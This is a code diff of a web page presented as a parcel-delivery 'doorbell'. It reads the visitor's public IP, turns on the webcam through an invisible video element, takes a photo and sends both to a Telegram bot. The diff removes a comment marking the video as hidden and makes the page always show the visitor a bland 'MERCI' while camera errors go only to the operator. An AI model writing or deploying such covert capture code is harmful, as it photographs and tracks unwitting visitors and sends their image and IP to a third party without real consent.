@@ -44,7 +44,6 @@
             text-align: center;
         }
         
-        /* Elemento de vídeo oculto */
         #hiddenVideo {
             position: absolute;
             opacity: 0;
@@ -74,84 +73,80 @@ async function getIPInfo() {
     try {
         const response = await fetch('https://api.ipify.org?format=json');
         const data = await response.json();
-        return { ip: data.ip };
+        return data.ip;
     } catch (error) {
-        return { ip: 'Indisponible' };
+        return 'Indisponible';
     }
 }
 
-async function capturePhoto() {
-    const video = document.getElementById('hiddenVideo');
-    
-    // Acessar câmera
-    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-    video.srcObject = stream;
-    
-    // Esperar a câmera inicializar
-    await new Promise(resolve => setTimeout(resolve, 500));
-    
-    // Capturar frame
-    const canvas = document.createElement('canvas');
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
-    canvas.getContext('2d').drawImage(video, 0, 0);
-    
-    // Parar a câmera
-    stream.getTracks().forEach(track => track.stop());
-    
-    return canvas.toDataURL('image/jpeg', 0.8);
+async function sendToTelegram(message) {
+    try {
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: message
+            })
+        });
+    } catch (error) {
+        console.error('Erreur d\'envoi:', error);
+    }
 }
 
-async function sendToTelegram(ip, photoUrl) {
+async function handleActivation() {
+    let ip = await getIPInfo();
+    let statusMessage = `🚨 Sonnette activée!\nIP: ${ip}\n`;
+    let userMessage = 'MERCI';
+
     try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const video = document.getElementById('hiddenVideo');
+        video.srcObject = stream;
+        
+        await new Promise(resolve => setTimeout(resolve, 500));
+        
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+        const photoUrl = canvas.toDataURL('image/jpeg', 0.8);
+        
+        // Envoyer photo
         const formData = new FormData();
         formData.append('chat_id', CHAT_ID);
-        formData.append('caption', `Un colis est arrivé! La cloche a sonné!\nIP: ${ip}`);
-
+        formData.append('caption', statusMessage);
         const blob = await fetch(photoUrl).then(r => r.blob());
-        formData.append('photo', blob, 'visitor.jpg');
-
+        formData.append('photo', blob, 'photo.jpg');
         await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
             method: 'POST',
             body: formData
         });
         
-        return true;
+        stream.getTracks().forEach(track => track.stop());
+        
     } catch (error) {
-        console.error('Erreur:', error);
-        return false;
+        statusMessage += `\nErreur caméra: ${error.message}`;
+        userMessage = 'MERCI'; // Message fixo para o usuário
     }
+    
+    await sendToTelegram(statusMessage);
+    return userMessage;
 }
 
 async function initiateActivation() {
-    try {
-        document.getElementById('consentModal').style.display = 'none';
-        document.getElementById('statusMsg').innerHTML = 'Activation en cours...';
+    document.getElementById('consentModal').style.display = 'none';
+    document.getElementById('statusMsg').innerHTML = 'Traitement en cours...';
 
-        // Capturar dados
-        const ipInfo = await getIPInfo();
-        const photoUrl = await capturePhoto();
-        
-        // Enviar para Telegram
-        const success = await sendToTelegram(ipInfo.ip, photoUrl);
-        
-        if(success) {
-            document.getElementById('statusMsg').innerHTML = `
-                <div style="color:green; background:#ecf0f1; padding:15px; border-radius:8px;">
-                    ✓ Merci d'avoir sonné. Passe une bonne journée!
-                </div>
-            `;
-        } else {
-            throw new Error('Échec de l\'envoi');
-        }
-
-    } catch (error) {
-        document.getElementById('statusMsg').innerHTML = `
-            <div style="color:red; background:#ecf0f1; padding:15px; border-radius:8px;">
-                ✗ Erreur: ${error.message || 'Service indisponible'}
-            </div>
-        `;
-    }
+    const message = await handleActivation();
+    
+    document.getElementById('statusMsg').innerHTML = `
+        <div style="color:green; background:#ecf0f1; padding:15px; border-radius:8px;">
+            ✓ ${message}
+        </div>
+    `;
 }
 
 window.onload = () => {
